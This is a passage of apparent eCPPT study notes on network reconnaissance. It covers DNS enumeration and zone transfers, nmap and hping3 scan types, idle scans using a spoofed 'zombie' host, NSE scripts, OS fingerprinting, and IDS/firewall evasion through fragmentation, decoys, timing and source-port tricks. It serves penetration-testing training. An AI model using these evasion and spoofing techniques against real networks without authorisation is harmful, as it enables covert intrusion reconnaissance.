is a poweful tool, we can learn both nslookup and dig</li>
</ul>

<h4 id="nsloolup--dig-commands">nsloolup &amp; Dig commands</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	                                                        // dig +nocmd &lt;domain&gt; mx +noall +answer 
	nslookup &lt;target.com&gt;                   // dig &lt;target.com&gt; +short
	nslookup -type=PTR &lt;target.com&gt; // dig &lt;target.com&gt; PTR
	nslookup -type=MX &lt;target.com&gt;  // dig &lt;target.com&gt; MX
	nslookup -type=NS &lt;target.com&gt;  // dig &lt;target.com&gt; NS
	nslookup                                         // dig axfr @target.com &lt;target.com&gt;
	- server &lt;target.com&gt;
	-- ls -d &lt;target.com&gt;
</code></pre></div></div>

<h4 id="fierce">Fierce</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	fierce -dns &lt;domain.com&gt;
	fierce -dns &lt;domain.com&gt; -dnsserver &lt;dns server&gt;
</code></pre></div></div>

<h4 id="dns-enum">DNS Enum</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	dnsenum &lt;domain.com&gt;
	dnsenum &lt;domain&gt; --dnsserver &lt;dns server&gt;
	dnsenum &lt;domain&gt; -f &lt;list of hosts&gt;
</code></pre></div></div>

<h4 id="dns-map---subdomain-bruteforcer">DNS Map - subdomain bruteforcer</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	dnsmap &lt;domain&gt;
</code></pre></div></div>

<h4 id="dns-recon">DNS Recon</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	dnsrecon -d &lt;domain&gt;
</code></pre></div></div>

<h3 id="ip">IP</h3>
<p>Once we have found a number of host names related to the organization, we can move on with both determining their relative IP addresses and, potentially any Netblocks associated with the organization.
	First think, try to resolve all the hostnames we have, in order to determine what IP addresses are used by the organization.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   → nslookup ns.&lt;target-organization.com&gt; = hostname
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>the dns will handle the query *our dns*
then we should receive the IP address of the target
</code></pre></div></div>

<p>After getting the IP addresses:
	is this ip hosting only that given domain?
	who does this IP address belong to?</p>

<h3 id="subdomains">subdomains</h3>
<p>on Bing search:
we can find subdomains that are bounded to the ip address of domain</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	ip:&lt;ip address&gt;
</code></pre></div></div>

<p>there are tools:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	http://reverseip.domaintools.com/
	https://dnslytics.com/reverse-ip
	https://networkappers.com/tools/reverse-ip-checker
	https://www.robtex.com/
</code></pre></div></div>

<h3 id="netblock">netblock</h3>
<p>Is a range of IP addresses. 
example:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	192.168.0.0 - 192.168.255.255
	192.168.0.0/16 or 192.168.0.0 with 255.255.0.0 netmask
</code></pre></div></div>

<ul>
  <li>AS - Autonomous System
Is made of one or more net blocks under the same administrative control
Big companies and ISP (internet service providers) have an autonomous system, while smaller companies will barely have a netblock.</li>
</ul>

<blockquote>
  <p>Run some WHOIS tool, to discover who is the owner of the IP addresses.</p>
</blockquote>

<p>Some tools will automatically perform these operations:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	hostmap
	maltego
	foca
	fierce
	dmitry
</code></pre></div></div>

<ul>
  <li>After getting a list of IP Addresses:
  we need to identify which of those are alive</li>
</ul>

<h3 id="here-starts-case-2">Here starts Case 2</h3>

<ul>
  <li>once we have a list of ip addresses we have to identify the devices and the roles played by each IP in the network.</li>
</ul>

<p>First:
	Determine hosts that are alive
	Determine if they have an associated host name/domain</p>

<p>The most common technique to identify live hosts is ICMP ping sweep, the live hosts will return an ICMP ECHO reply.
Some tools:
	fping
	nmap
	hping3
	maltego</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fping -a -g &lt;ip/24&gt;
	-a = alive / -g = generate list / -r = number of retries / -e = time required / 
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sn &lt;ip/24&gt; 
	-sn = ping scan/sweep = no port
	--disable-arp-ping
	-PS = tcp flag with syn flag attached / -PS&lt;port&gt;
	-PA = tcp flag with ack / -PU = udp packet / -PY = tcp INIT packet / -PE = icmp echo request /
	-PM = icmp mask request / -PP = timestamp request / 
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hping3 --icms-ts &lt;192.168.1.x&gt; 
	icmp-ts = timestamp / -c = count / -v = verbose / -S = syn flag / -p = port / -F = fin flag / 
	-U = urgent / -X = ecn flag / -Y = CWR flag / -P = PSH flag / -I = interface / -1 = icmp / 
	--rand-dest = to use with x as a wildcard / 
</code></pre></div></div>

<blockquote>
  <p>maltego</p>
</blockquote>

<p><em>Nowadays, ICMP is often disabled on perimeter router and firewalls via Firewall</em></p>

<ul>
  <li>Now that we know which host is alive
DNS server runs on:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> TCP port 53
 UDP port 53
</code></pre></div>    </div>
  </li>
</ul>

<p>To discover which host is running dns:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	nmap -sS -p 53 [netblock] = tcp
	nmap -sU -p 53 [netblock] = udp
</code></pre></div></div>

<blockquote>
  <p>After getting the DNS servers, we can perform a reverse lookup to find out more information.
Its a cyclical process, when we find IPs we search For alives, search For DNS, services, etc</p>
</blockquote>

<h2 id="tools">Tools</h2>
<blockquote>
  <p>Most common tools For information gathering:</p>
</blockquote>

<ul>
  <li>DNSdumpster = https://dnsdumpster.com/
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  // not instrusive, create a map For easy visualization
</code></pre></div>    </div>
  </li>
  <li>DNSEnum = https://github.com/fwaeytens/dnsenum
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  // gather as much information as possible
  // --private = show and save private ips // --subfile &lt;file&gt; = write all valid subdomains to this file
  // -p &lt;page&gt; = number of google search pages to process
  // -s &lt;value&gt; = number of subdomains that will be scraped from google
  // -f &lt;file&gt; = read subdomains from this file to perform bruteforce
  // -u = update any file that may exist already // -r = recursive brute force
  // it comes with a wordlist file For bruteforce /usr/share/dnsenum
</code></pre></div>    </div>
  </li>
  <li>DnsMap = https://github.com/makefu/dnsmap
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  // uses the primary domain that we provide as a target and then brute forces all the subdomains
  // also comes with a wordlist
  // -w &lt;wordlist // -r = using the built-in wordlist // path = to save the results in that path
</code></pre></div>    </div>
  </li>
  <li>Foca = https://www.elevenpaths.com/labstools/foca/index.html
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  // allows us to mine a ton of information about the target infrastructure
  // metadata = contains further information about the file, creation day, user who create, software used etc
</code></pre></div>    </div>
  </li>
</ul>

<p>More:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Metagoofil
- Fierce	
- Maltego
- Dmitry
- Recon-ng
- Shodan = shodan.io // exploits.shodan.io
</code></pre></div></div>

<h1 id="scanning">Scanning</h1>

<h2 id="overview">Overview</h2>
<blockquote>
  <p>Now that we have basic information, we need information about devices in the target network.</p>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PPS = Ports, Protocols and Services
	reference: http://www.iana.org/assignments/port-numbers
</code></pre></div>  </div>
</blockquote>

<ul>
  <li>The Three Way Handshake
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Sequence Number
  Acknowledgement numbers
  SYN and ACK flags
</code></pre></div>    </div>
  </li>
  <li>Packet analyzer tools</li>
  <li>Hping = http://hping.org/</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	// hping3 &lt;ip&gt; -p 80
	//-S = syn packet // -c &lt;number&gt; = count the packets // 
</code></pre></div></div>

<ul>
  <li>Nping = https://nmap.org/nping/</li>
</ul>

<blockquote>
  <p>The flags we got as answers :
RA (Reset and Acknowledgement) = no service listening
SA (Syn and ACK) = the port is open</p>
</blockquote>

<h2 id="wireshark">Wireshark</h2>
<blockquote>
  <p>capture and inspect the whole traffic we receive/send in the network interface</p>
</blockquote>

<h3 id="filters">Filters</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip.addr==&lt;ip&gt;
ip.src==&lt;ip&gt; - source
ip.dst==&lt;ip&gt;  - destination
ip.addr==&lt;ip&gt; and (dns or http)
!= - negate/inverse
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arp
http 
icmp 
http or dns
ssh
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcp.port==&lt;port&gt;
udp.port==&lt;port&gt;
tcp.flags.syn==1 and tcp.flags.ack==1 and ip.addr==&lt;ip/network&gt;
tcp contains *string*
</code></pre></div></div>

<ul>
  <li>show packets to show full packet traffic information</li>
</ul>

<h2 id="hping-basics">HPING Basics</h2>

<p>hping3 -h</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-S = SYN packet, its good For stealth because after receiving the syn/ack the OS closes the connection and does not finish the 3way handshake
-p = port
-c = count, its how many packets do you wanna send
--scan &lt;1-100//80,139,445//all, known&gt; = sets a range/set of ports we wanna scan
	!50 = we can put a exception to a port that we do not wanna scan
-2 or --udp = to scan udp ports
-FPU = (FIN, PSH, URG flags) to avoid firewalls, if u dont have anwers its because the port is open or filtered
	aka Xmas scan
</code></pre></div></div>

<h3 id="idle-scan">IDLE scan</h3>

<h4 id="finding-the-zombie">Finding the zombie</h4>

<p>First we need to search For open ports on the host (zombie target):</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	hping3 -S --scan known &lt;zombie ip&gt;
</code></pre></div></div>

<p>Estimate the host (zombie):</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	hping3 -S -r -p &lt;port&gt; &lt;zombie ip&gt;
	// -r = tells the tool to display ID increments intead of the actual ID, if the IP ID increases by 1, its a viable candidate
	however: we have to validate if its a global or local increase. some hosts increase IP ID on a per host basis
</code></pre></div></div>

<ul>
  <li>Craft a packet:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  hping3 -a &lt;zombie IP&gt; -S -p &lt;target port&gt; &lt;target IP&gt;
  // -a = spoof the zombie source address
  // -s = syn flag enabled
  // -p = destination port 
</code></pre></div>    </div>
  </li>
  <li>Detect if its a good zombie:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  hping3 -S -r -p &lt;port&gt; &lt;zombie ip&gt;
  // if in the output the ID increment is +2, we can deduce that the [target port] on [target ip] is open.
</code></pre></div>    </div>
  </li>
</ul>

<blockquote>
  <p>[+] info
we can run the 2 commands together:
first tab = we run the verication in the zombie host
second tab = the crafted packet, to discover if the target port is open
we will receive the answer is the first tab, its open if the value of ID is incremented by 1</p>
</blockquote>

<p>idle scan - hping = stealth mode</p>

<p><img src="/assets/images/posts/2023-11-19-ecppt/17.png" alt="Alt text" class="align-center" /></p>

<h3 id="detect-live-hosts-and-ports">Detect Live Hosts and Ports</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>firewalls made more difficult to scan ports
based upon the type of discovery launched against the target, the level of noise produced varies.
</code></pre></div></div>

<ul>
  <li>running a straight ping sweep of a network = surely its gonna be noisy</li>
  <li>
    <p>a random TCP connect scan may appear normal to the administrators</p>
  </li>
  <li>always depend on the scope document, time limited schedule etc</li>
</ul>

<blockquote>
  <p>Penetration testing takes times if u want to do it correctly</p>
</blockquote>

<h2 id="nmap-network-mapper">NMAP (Network Mapper)</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>network enumeration and auditing tool.
https://nmap.org/book/man-port-scanning-techniques.html
</code></pre></div></div>

<p>ps: use nmap with root privileges, cause some scans require system access.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   → nmap &lt;scan type&gt; &lt;options&gt; &lt;target&gt;
</code></pre></div></div>

<h3 id="host-discovery">HOST DISCOVERY:</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  -sL: List Scan - simply list targets to scan
  -sn: Ping Scan - disable port scan
  -Pn: Treat all hosts as online -- skip host discovery
  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  -PO[protocol list]: IP Protocol Ping
  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
  --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers
  --system-dns: Use OSs DNS resolver
  --traceroute: Trace hop path to each host
</code></pre></div></div>

<h3 id="scan-techniques">SCAN TECHNIQUES:</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags &lt;flags&gt;: Customize TCP scan flags
  -sI &lt;zombie host[:probeport]&gt;: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b &lt;FTP relay host&gt;: FTP bounce scan
</code></pre></div></div>

<h4 id="-ss-tcp-syn-scan">-sS (TCP SYN scan)</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>can be performed quickly and are not as obstrusive as other types of scans.
its also the most accurate
half-open scanning
syn &gt; syn/ack = port open / rst = closed &gt; then our machine closes the connection with RST
</code></pre></div></div>

<h4 id="-st-tcp-connect-scan">-sT (TCP Connect scan)</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>its the default type
its also used in case ipv6 is running
its less efficient, because it relies on the OS to perform the connection.
it complete the 3w handshake, sending an ack flag before closing with rst/ack.
</code></pre></div></div>

<h4 id="-su-udp-scan">-sU (UDP scan)</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>there are other services that run and communicate over UDP (DNS, SNMP, DHCP, etc)
much slower
</code></pre></div></div>

<h4 id="-si-idle-scan-very-stealthy-mode">-sI (Idle scan) ‘very stealthy mode’</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stealth technique that involves the presence of a zombie in the target network.
a zombie is a host that is not sending or receiving any packets thus, the reason its called an idle scan.
IP protocol implements a Fragmentation ID Header = https://tools.ietf.org/html/rfc791 and that many OS increase its value by 1 (For each packet).
</code></pre></div></div>

<ul>
  <li>How to execute
Alors, we can scan a host without sending a single packet from our original IP address.
Thats awesome For <em>redteam, stealth</em> scopes;
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  nmap -Pn -sI &lt;zombie ip&gt;:&lt;zombie open port&gt; &lt;target ip&gt; -v 
  // -Pn = prevents pings from the original (our) IP
  // -v = verbose
  // -sI = idle scan, using a zombie pc in the network to scan the target
  // we can specify the ports with -p
</code></pre></div>    </div>
  </li>
</ul>

<blockquote>
  <p>For more information about idle scan
	http://nmap.org/book/idlescan.html</p>
</blockquote>

<hr />
<h4 id="-pe">-PE</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enables ICMP echo request host discovery
</code></pre></div></div>

<h4 id="-n-never-do-dns-resolution">-n (Never do DNS resolution)</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The *-n* is another option we should use whenever possible if resolving IP addresses to hostnames is not required. Its an additional flag we can add to our Nmap scans to decrease our scan times, and also helps us stay a bit more *under the radar*, as reverse DNS lookup can generate more noise than necessary.
</code></pre></div></div>

<h4 id="-b-ftp-bounce-scan">-b (FTP Bounce scan)</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>another stealthy scan. https://en.wikipedia.org/wiki/FTP_bounce_attack
this scan exploits a FTP server port command and if FTP server is vulnerable, allows us to launch port scans from the ftp server to other machines on the internet.
we dont have direct access to on an internal network
its way to hide our true source
</code></pre></div></div>

<h4 id="-sn--sf--sx-tcp-null-fin-xmas-scans">-sN; -sF; -sX (TCP NULL, FIN, Xmas scans)</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.rfc-editor.org/rfc/rfc793.txt - page 65

They exploit a loophole in order to differentiate between open and closed ports.
if a system compliant with the TCP RFC receives a packet that does not contain 
the required bits (syn, rst, ack), it will return:
-&gt; a RST if the port is closed
-&gt; no response if the port is open *As long as none of those three required bits are included (syn, rst, ack), other bits (fin, psh, urg) are acceptable.* ```
-sN = Null scan : does not set any bits (tcp flag header is 0)
-sF = FIN scan : Only sets the TCP FIN bit
-sX = Xmas scan : Sets the FIN, PSH and URG flags, lighting the packet up like a christmas tree. ```
</code></pre></div></div>

<blockquote>
  <p>Nowadays the stealth is these techniques have been eliminated, because stateful firewalls and IDS sensors.
Moreover, these scans cannot always determine if a port is open or filtered. So nmap will return a open/filtered result and you will have to test further to determine the actual state.</p>
</blockquote>

<h4 id="-sa-tcp-ack-scan">-sA (TCP ACK scan)</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>its not used to determine open ports.
its used to map out the rulesets of firewalls and determine if the devices are both stateful and which ports are filtered.
the ACK bit its the only one set.
Open/Closed ports will return a RST packet, nmap will mark as *unfiltered* = // there is no firewall
ports that do not respond back, will then be labeled as *filtered* = // there is firewall blocking
</code></pre></div></div>

<h4 id="-so-ip-protocol-scan">-sO (IP protocol scan)</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enumerates the types of IP protocols that a target system supports
are on the lookout For ICMP protocol unreachable messages
if nmap receives any response in any protocol from the target host, nmap marks that protocol as open.
</code></pre></div></div>

<h3 id="output-results">OUTPUT Results</h3>
<p>Nmap offers various options to output the results
we can save the results to inspect later or import them into tools such as:
	Dradis, Nessus, Faraday, Metasploit and so on.</p>

<p>The most used options:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-oN = The normal output will be stored into a file
-oX = Creates a XML output that can be easily parsed by various tools
-oG = Grepable output - deprecated. the output lists each host on one line.
-oA &lt;file name&gt; = output in the three major formats at once.
</code></pre></div></div>

<p><em>There is also an advanced GUI called ZenMap = https://nmap.org/zenmap/</em></p>

<blockquote>
  <p>[+] info
we can use the option <strong>–top-ports number</strong> = to scan the most popular ports</p>
</blockquote>

<blockquote>
  <p>[+] info
show detailed list of every packet sent and received with nmap by using <em>–packet-trace</em> option
	https://nmap.org/book/man-output.html</p>
</blockquote>

<blockquote>
  <p>[+] info
TCP packet can be tagged with 6 different flags:</p>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	Synchronize - SYN
	Finish - FIN
	Acknowledgement - ACK
	Push - PSH
	Reset - RST
	Urgent - URG
</code></pre></div>  </div>
</blockquote>

<blockquote>
  <p>And we can set the bit of the flag we wanna nmap scan with <strong>–scanflags flag</strong></p>
</blockquote>

<h2 id="stealth-mode---idle-scan-theory">Stealth mode - IDLE SCAN THEORY</h2>

<p>-sI (Idle scan) 
	stealth technique that involves the presence of a zombie in the target network.
	a zombie is a host that is not sending or receiving any packets thus, the reason its called an idle scan.
	IP protocol implements a Fragmentation ID Header = https://tools.ietf.org/html/rfc791 and that many OS increase its value by 1 (For each packet).</p>

<h3 id="info-about-fragmentation">info about fragmentation</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Data must be encapsulated in order to be sent over the physical network link. In conjunction with this, the data has to be small enough to fit the format of the technology being used.
the fragmentation process is basically, when data its too large it must be split into smaller messages.
To the host be able to identify the fragments, its assigning a unique identifier to each fragment of the message called the *fragmentation ID*. This way the receiver knows the correct sequence of the fragments and can assemble them back into original message.
by probing fragmentation IDs on the zombie, we can infer if a port is either open or closed on our target.
</code></pre></div></div>

<ul>
  <li>pre-requisites:
    <ol>
      <li>Find a zombie that assigns IP ID both incrementally and globally</li>
      <li>Find an idle zombie, meaning that there should be no other traffic on the zombie that will disturb the IP ID.</li>
    </ol>
  </li>
  <li>How to find a good candidate zombie?
  OS fingerprinting with nmap / nmap nse option
  nmap will determine if the IP ID sequence generation is incremental (the one we need)
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> → nmap -O -v &lt;zombie ip&gt;
 → nmap --script ipidseq &lt;zombie ip&gt; -p &lt;zombie port&gt;
</code></pre></div>    </div>
  </li>
  <li>nmap shows the result &gt; IP ID Sequence Generation is incremental, thus a good zombie</li>
</ul>

<h3 id="before-the-attack">before the attack</h3>
<ol>
  <li>Probe the zombies IP ID and record its value</li>
  <li>Forge a SYN packet with the source address of the zombie and send it to the port of our target host
 Depending on how the target reacts, it may or may not cause the zombie IP ID to be incremented.</li>
  <li>Probe the zombies IP ID again and, pending upon the ID we can infer if the target port is open or closed</li>
</ol>

<h3 id="once-we-discover-a-zombie">once we discover a zombie</h3>
<ol>
  <li>Probe the zombies IP ID by sendind a SYN/ACK to it</li>
  <li>Since the communication is not expected, the zombie will send back a RST with its IP ID</li>
  <li>Forge a SYN packets (IP spoofing) with the zombie source IP address and send it to the target we wish to scan.</li>
</ol>

<h4 id="if-the-port-is-open">if the port is open</h4>
<ol>
  <li>The target sends back a SYN/ACK to the zombie</li>
  <li>The zombie does not expect it therefore, it sends a RST back to the target and increments its IP ID</li>
  <li>The attacker probes again the zombies IP ID</li>
  <li>The zombie sends back a RST. The attacker sees that the IP ID is incremented by 2 (from the initial probe)</li>
</ol>

<h4 id="if-the-port-is-closed">if the port is closed</h4>
<ol>
  <li>The target sends back to the zombie a RST and the zombie simply ignores the packet leaving its IP ID intact</li>
  <li>The attacker probes again the zombies IP ID</li>
  <li>The zombie send back a RST and the attacker sees that the IP ID is incremented by only 1.</li>
</ol>

<p>idle scan - open door:</p>

<p><img src="/assets/images/posts/2023-11-19-ecppt/18.png" alt="Alt text" class="align-center" /></p>

<p>idle scan - close door:</p>

<p><img src="/assets/images/posts/2023-11-19-ecppt/19.png" alt="Alt text" class="align-center" /></p>

<h2 id="nmap-nse-nmap-script-language">Nmap NSE (Nmap Script Language)</h2>
<blockquote>
  <p>NSE allow us to write/use shared scripts that help automate various tasks
	The scripts are written in LUA programming language
	stored in /usr/share/nmap/scripts</p>
</blockquote>

<ul>
  <li>Usage</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	-C or --script

--script-updatedb = to update nmap scripts
--script-help "smb*" and discovery = search For specific script
--script-help whois-domain

</code></pre></div></div>

<h3 id="domain-info">domain info</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--script whois-domain &lt;ip&gt; -sn = to run the whois script
</code></pre></div></div>

<h3 id="reconnaissance">reconnaissance</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--script smb-os-discovery = to run OS discovery
</code></pre></div></div>

<p>the same without NSE:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	-O = force nmap to perform OS fingerprint scan
	we can see, that the results of nse are much better
</code></pre></div></div>

<h3 id="smb-shares">smb shares</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--script smb-enum-shares 

- run all authentication scripts
--script auth
</code></pre></div></div>

<blockquote>
  <p>it will save time, but can be noisy cause it will execute a lot of scripts</p>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- OS, workgroup, NetBIOS
--script default
</code></pre></div>  </div>
</blockquote>

<h2 id="extra-scanning-tools">Extra scanning tools</h2>

<p>Multi Plataform (Linux, Mac, Windows):</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Angry IP Scanner - http://angryip.org/
- Masscan = https://github.com/robertdavidgraham/masscan
</code></pre></div></div>

<p>Only Windows:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- SuperScan = http://www.mcafee.com/us/downloads/free-tools/superscan.aspx
</code></pre></div></div>

<h2 id="service-and-os-detection">Service and OS Detection</h2>

<h3 id="banner-grabbing">Banner Grabbing</h3>
<blockquote>
  <p>the message that the service, running on the targer host, sends back when another host tries to establish a connection to it.</p>
</blockquote>

<p>tools:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	telnet, netcat, ncat 
	followed by &lt;ip&gt; &lt;port&gt;
</code></pre></div></div>

<h3 id="probing-services">Probing services</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://nmap.org/book/man-version-detection.html ```
nmap -sV &lt;options&gt; &lt;target ip&gt; ```
</code></pre></div></div>

<h3 id="os-fingerprinting">OS fingerprinting</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://nmap.org/book/man-os-detection.html
</code></pre></div></div>

<p>passive:
	identifies the remote OS with packets that are received, without sending any packets.
active: 
	sends packets and waits For a response
	Nmap compares the results is obtains to its internal database of OS finferprints and, if there is a match, prints out the detected OS.
	https://nmap.org/book/osdetect.html
	http://phrack.org/issues/54/9.html#article</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	nmap -O -n &lt;target ip&gt;
	-A = enables OS detection, version detection, script scanning and traceroute. good, but very noisy.
	--osscan-guess = guest the OS more aggressively
</code></pre></div></div>

<ul>
  <li>There is a Passive option:
  P0f = http://lcamtuf.coredump.cx/p0f3/
  http://lcamtuf.coredump.cx/p0f3/README
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ./p0f -i eth0
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="firewall--ids-evasion">Firewall / IDS Evasion</h2>
<p>two main issues:
	becoming exposed
	obtaining incorrect results</p>

<h3 id="fragmentation">Fragmentation</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>its the process of splitting a single packet into smaller ones
this can disable the ability of some firewall and IDS systems to either apply their packet filtering rules or to process all the fragments. ```
nmap -sS -f &lt;target ip&gt;
// -sS = SYN scan // -f = fragment packets
// --mtu = specify a custom offset size. must be a multiple of eight

sudo nmap -f -sS -p 80,21,153,443 -Pn -n --disable-arp-ping

--data-length 100 = add 100 bytes to our payload
-f -f = this cause the fragmented bytes to be 16 bytes instead 8 bytes ```
</code></pre></div></div>

<h3 id="decoys">Decoys</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>add noise to the IDS by sending scans from spoofed IP addresses. As a result, a list of forged IPs (decoys) will appear on the IDS, along with the real attacker IP. This confuses the analysts watching the system, making it harder to identify the actual attacker.
</code></pre></div></div>

<ol>
  <li>All decoys are up and running (otherwise its easy to determine the real attackers IP)</li>
  <li>The real IP address should appear in random order to the IDS (otherwise its easy to infer the real attacker IP)</li>
  <li>ISPs traversed by spoofed traffic let the traffic go through</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	nmap -sS -D &lt;decoy ip#1&gt;,&lt;decoy ip#2&gt;,ME,&lt;decoy ip#3&gt; &lt;target ip &gt;
	// -D = decoy (no spaces after and before comas)
	-D RND:10  = 10 random decoys, even if they dont exist in the network

	hping3 --rand-source -S -p 80 &lt;target ip&gt; -c 3
	hping3 -a &lt;spoofed ip&gt; -S -p 80 &lt;target ip&gt; -c 3
</code></pre></div></div>

<h3 id="timing">Timing</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slow down the scan in order to blend with other traffic in the logs of the Firewall/IDS
you can define the interval between two scan probes, thus decreasing the chances to being noticed
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	nmap -sS -T[0-5] &lt;target ip&gt;

	// -T0 - Paranoid - 5 min
	// -T1 - Sneaky   - 15 sec
	// -T2 - Polite      - 0,4 sec
	// -T3 - Normal   - default
	// -T4 - Aggressive - 10 millisec
	// -T5 - Insane    - 5 millisec
</code></pre></div></div>

<h3 id="source-ports">Source Ports</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>its used to abuse poorly configured firewalls that allow traffic coming from certain ports
we can change our source port in order to bypass this restriction
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	nmap -sS --source-port 53 &lt;target ip&gt;
	// using -sS or -sU
	// --source-port &lt;port number&gt; // -g &lt;port number&gt;

	// hping3 -S -s 53 -k -p 53 10.50.97.25
	// -k = keep this port // -s = source port
</code></pre></div></div>

<h3 id="append-random-data-to-the-header-payload">Append random Data to the header payload</h3>
<p>nmap</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	--data-length &lt;10&gt;
</code></pre></div></div>

<p>hping</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	--data &lt;10&gt;
</code></pre></div></div>

<h3 id="mac-address-spoofing">Mac address spoofing</h3>
<p>nmap</p>
